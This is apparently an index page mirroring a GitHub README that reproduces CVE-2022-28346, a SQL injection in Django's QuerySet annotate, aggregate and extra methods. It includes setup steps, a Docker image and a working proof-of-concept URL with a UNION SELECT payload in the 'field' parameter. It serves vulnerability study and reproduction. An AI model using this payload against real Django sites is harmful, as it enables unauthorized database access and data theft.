# CVE-2022-28346

Django QuerySet.annotate(), aggregate(), extra() SQL 注入

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/DeEpinGh0st](https://github.com/DeEpinGh0st) |
| Url      | [https://github.com/DeEpinGh0st/CVE-2022-28346](https://github.com/DeEpinGh0st/CVE-2022-28346)                                               |
| Stars    | 23                                                          |
| License  | No License                                                        |

<details>

<summary>Topic / Tags</summary>



</details>

## Readme

### CVE-2022-28346
Django QuerySet.annotate(), aggregate(), extra() SQL 注入

### 环境初始化
```
1.python manage.py makemigrations
2.python manage.py migrate
3.访问http://x.x.x.x:8000/ 插入初始化数据
```

### 漏洞复现

```
访问http://x.x.x.x:8000/demo
POC: http://x.x.x.x:8000/demo?field=demo.name" FROM "demo_user" union SELECT "1",sqlite_version(),"3" --
```

![image-20220426224053969](./image-20220426224053969.png)

### Docker

```
docker pull s0cke3t/cve-2022-28346:latest
```




## Get the content

```
git clone https://github.com/DeEpinGh0st/CVE-2022-28346
cd CVE-2022-28346
```

{% embed url="https://github.com/DeEpinGh0st/CVE-2022-28346" %}

<figure><img src="https://avatars.githubusercontent.com/u/34375573?v=4" alt=""><figcaption><p>DeEpinGh0st</p></figcaption></figure>
